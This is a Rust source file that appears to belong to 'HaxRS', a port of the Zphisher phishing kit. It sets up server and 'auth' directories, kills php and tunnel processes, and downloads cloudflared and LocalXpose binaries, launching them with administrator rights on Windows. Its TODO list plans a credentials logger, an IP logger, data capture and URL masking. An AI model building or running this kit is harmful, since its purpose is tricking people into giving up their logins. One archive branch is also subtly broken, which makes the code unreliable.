use crate::behind::cli::{error_msg, log_msg};
use crate::behind::constants::*;
use crate::behind::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir};

use colored::Colorize;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{exit, Command};

use reqwest::Url;
use std::fs::{File, OpenOptions};
use zip::read::ZipFile;
use zip::ZipArchive;
use rayon::prelude::*;


pub fn setup_directories() {
    let base_dir = match get_data_dir() {
        Some(e) => e.join("zphisher"),
        None => {
            log::error!("{}", "Failed to get home directory".red());
            error_msg("Failed to get home directory");
            exit(1);
        }
    };

    create_dir_if_not_exists(&base_dir.join(".server"));
    create_dir_if_not_exists(&base_dir.join("auth"));
    create_dir_if_not_exists(&base_dir.join(".server/www"));
    remove_file_if_exists(&base_dir.join(".server/.loclx"));
    remove_file_if_exists(&base_dir.join(".server/.cld.log"));
}

fn handle_error<T, E: std::fmt::Display>(result: Result<T, E>, error_msg_: &str) {
    match result {
        Ok(_) => {}
        Err(e) => {
            log::error!("{}", e);
            error_msg(&format!("{}: {}", error_msg_, e));
            exit(1);
        }
    }
}

fn create_dir_if_not_exists(dir: &Path) {
    if !dir.exists() {
        handle_error(fs::create_dir_all(dir), "Failed to create directory");
    }
}

/*
fn recreate_dir(dir: &Path) {
    if dir.exists() {
        handle_error(fs::remove_dir_all(dir), "Failed to remove directory");
    }
    handle_error(fs::create_dir_all(dir), "Failed to create directory");
}
*/

fn remove_file_if_exists(file: &Path) {
    if file.exists() {
        handle_error(fs::remove_file(file), "Failed to remove file");
    }
}

pub fn banner() {
    const BANNER: &str = r#"
     ______      _     _     _
    |___  /     | |   (_)   | |
       / / _ __ | |__  _ ___| |__   ___ _ __
      / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
     / /__| |_) | | | | \__ \ | | |  __/ |
    /_____| .__/|_| |_|_|___/_| |_|\___|_|
          | |
          |_|
"#;
    println!("{}", BANNER.bright_red());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
    println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
}

pub fn banner_small() {
    const BANNER: &str = r#"
░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
"#;
    println!("{}", BANNER.cyan());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
}

#[cfg(target_os = "windows")]
pub fn kill_pid() {
    log::info!("Killing processes");
    use sysinfo::{ProcessExt, System, SystemExt};
    let processes_to_kill = vec![
        "php.exe",
        "cloudflared-windows-amd64.exe",
        "loclx.exe",
        "cloudflared-windows-386.exe",
    ];
    let mut sys = System::new_all();

    // We refresh the list of processes.
    sys.refresh_processes();

    for (pid, proc) in sys.processes() {
        if processes_to_kill.contains(&proc.name()) {
            // Kill the process by PID
            if let Err(e) = Command::new("taskkill").arg("/PID").arg(pid.to_string()).arg("/F").output() {
                log::error!("Failed to kill process {}: {}", pid, e);
                error_msg(&format!("Failed to kill process {}: {}", pid, e));
            }
        }
    }
}

#[cfg(target_os = "linux")]
pub fn kill_pid() {
    let processes_to_kill = vec!["php", "cloudflared", "loclx"];
    let procs = match procfs::process::all_processes() {
        Ok(p) => p,
        Err(e) => {
            error_msg(&format!("Failed to get processes: {}", e));
            return;
        }
    };

    for proc in procs {
        if let Ok(cmd) = {
            match proc {
                Ok(ref a) => a,
                Err(e) => {
                    log::error!("Failed to get process: {}", e);
                    error_msg(&format!("Failed to get process: {}", e));
                    continue;
                }
            }
        }.cmdline() {
            if let Some(process_name) = cmd.get(0) {
                if processes_to_kill.contains(&process_name.as_str()) {
                    if let Err(e) = nix::sys::signal::kill(
                        nix::unistd::Pid::from_raw({
                            match proc {
                                Ok(v) => v,
                                Err(e) => {
                                    log::error!("Failed to get process: {}", e);
                                    error_msg(&format!("Failed to get process: {}", e));
                                    continue;
                                }
                            }.pid
                        } as i32),
                        nix::sys::signal::Signal::SIGKILL,
                    ) {
                        log::error!("Failed to kill process: {}", e);
                        error_msg(&format!("Failed to kill process: {}", e));
                    }
                }
            }
        }
    }
}


fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let file_name: &str = url.split('/').last().unwrap_or("tmp.bin");
    let file_extension: &str = file_name.split('.').last().unwrap_or("");

    log::info!("Downloading {} to {}", url, file_name);

    let target_path = match get_server_dir() {
        Some(path) => path.join(file_name),
        None => Path::new(file_name).to_path_buf(),
    };

    log::info!("Target path (Raw installation): {:?}", target_path);

    // Download the file
    let client = reqwest::blocking::Client::new();
    let mut response = client.get(Url::parse(url)?).header("User-Agent", USER_AGENT).send()?;
    let mut file = File::create(&target_path)?;
    //file.write_all(response.bytes()?.as_ref())?;

    response.copy_to(&mut file)?;

    log::info!("File extension: {}", file_extension);
    log::info!("File name: {}", file_name);
    log::info!("Target path: {:?}", target_path);

    // Handle different file types
    // TODO: REMEMBER HERE *
    let mut outpath = PathBuf::new();

    match file_extension {
        "exe" => {
            outpath = target_path;
        }
        "zip" => {
            let mut archive: ZipArchive<File> = ZipArchive::new(File::open(&target_path)?)?;
            for i in 0..archive.len() {
                let mut file: ZipFile = archive.by_index(i)?;

                outpath = match get_server_dir() {
                    Some(path) => path.join({
                        match file.enclosed_name() {
                            Some(path) => path.to_owned(),
                            None => continue,
                        }
                    }),
                    None => continue,
                };

                let mut outfile = OpenOptions::new().create_new(true).write(true).append(true).open(&outpath)?;

                std::io::copy(&mut file, &mut outfile)?;
            }
            fs::remove_file(target_path)?;
        }
        #[cfg(target_os = "linux")]
        "tgz" => {
            let tar_gz = File::open(file_name)?;
            let tar = flate2::read::GzDecoder::new(tar_gz);
            let mut archive = tar::Archive::new(tar);
            archive.unpack(&target_path)?;
        }
        #[cfg(target_os = "windows")]
        _ => {
            log::error!("Unknown file type: {}", file_extension);
            error_msg(&format!("Unknown file type: {}", file_extension));
            return Err("Unknown file type".into());
        }

        #[cfg(not(target_os = "windows"))]
        _ => {}
    }
    log::info!("Outpath: {:?}", outpath);
    Ok(outpath)
}

pub fn install_dependencies() {
    log::info!("Checking dependencies");
    log_msg("Checking for dependencies...");

    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path: {}", e);
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = get_server_dir().unwrap_or(
        {
            match exe_path.parent() {
                Some(p) => p.to_path_buf(),
                None => {
                    log::error!("Failed to get current executable path");
                    error_msg("Failed to get current executable path");
                    return;
                }
            }
        }.join(BIN_PATH),
    );

    let download_links: Vec<&str> = get_download_urls();
    if files_exist(&bin_path) {
        return;
    }
    download_links.par_iter().for_each(|download_link| {
        /*
        #[cfg(not(target_os = "windows"))] let bin_path = match exe_path.parent() {
            Some(p) => p.join(get_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
            None => {
                log::error!("Failed to get current executable path");
                error_msg("Failed to get current executable path");
                return;
            }
        };*/

        log::info!("Bin Path (S281): {:?}", bin_path);

        if !bin_path.exists() {
            if let Err(e) = fs::create_dir(&bin_path) {
                log::error!("Failed to create 'bin' directory: {}", e);
                error_msg(&format!("Failed to create 'bin' directory: {}", e));
                return;
            }
        }

        match download(download_link) {
            Ok(p) => {
                log::info!("Downloaded {}", p.display());
                #[cfg(target_os = "windows")]
                if let Err(e) = Command::new("powershell").arg("-Command").arg("Start-Process").arg(&p).arg("-ArgumentList").arg("service").arg("install").arg("-Verb").arg("RunAs").output() {
                    log::error!("Failed to install {}: {e}", p.display());
                    error_msg(&format!("Failed to install {}: {e}", p.display()));
                }

                #[cfg(not(target_os = "windows"))]
                if let Err(e) = Command::new("chmod").arg("+x").arg(&p).output() {
                    log::error!("Failed to give execute permissions to {}: {e}", p.display());
                    error_msg(&format!(
                        "Failed to give execute permissions to {}: {e}",
                        p.display()
                    ));
                }
            }
            Err(e) => {
                log::error!("Failed to download(E310): {}", e);
                error_msg(&format!("Failed to download(E310): {}", e));
            }
        }
    });
}



// TODO: Add LocalXpose and Localhost.
// TODO: Add Custom Ports option.
// TODO: Add setting up site mechanism.
// TODO: Add IP logger.
// TODO: Add Credentials logger.
// TODO: Add Data Capture
// TODO: Add Start with Cloudflare.
// TODO: Add LocalXpose Auth.
// TODO: Add Start with LocalXpose.
// TODO: Add Start with Localhost.
// TODO: Add Tunnel Menu.
// TODO: Add URL shortener/masking.
// TODO: Add Menu.

// TODO: Add checks for file download!!!!
